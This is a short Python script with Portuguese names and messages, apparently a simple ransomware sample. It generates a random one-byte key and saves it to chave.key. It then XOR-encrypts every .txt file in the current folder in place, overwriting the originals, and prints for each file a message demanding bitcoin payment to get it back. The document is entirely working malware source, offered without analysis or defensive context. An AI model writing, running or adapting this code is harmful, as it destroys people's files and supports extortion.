import os
import random

def gerar_chave():
    return random.randint(1, 255)

def xor_arquivo(caminho, chave):
    with open(caminho, 'rb') as f:
        dados = bytearray(f.read())

    for i in range(len(dados)):
        dados[i] ^= chave

    with open(caminho, 'wb') as f:
        f.write(dados)

# --- Início ---
pasta = os.getcwd()
chave = gerar_chave()


with open("chave.key", "wb") as f:
    f.write(bytes([chave]))

print(f"Gerando chave: {chave}")

for nome in os.listdir(pasta):
    if nome.endswith(".txt") and nome != "chave.key":
        caminho = os.path.join(pasta, nome)
        xor_arquivo(caminho, chave)
        print(f"Arquivo criptografado, para ter novamente de volta, necessario realizar o pagamento via bitcon!! {nome}")
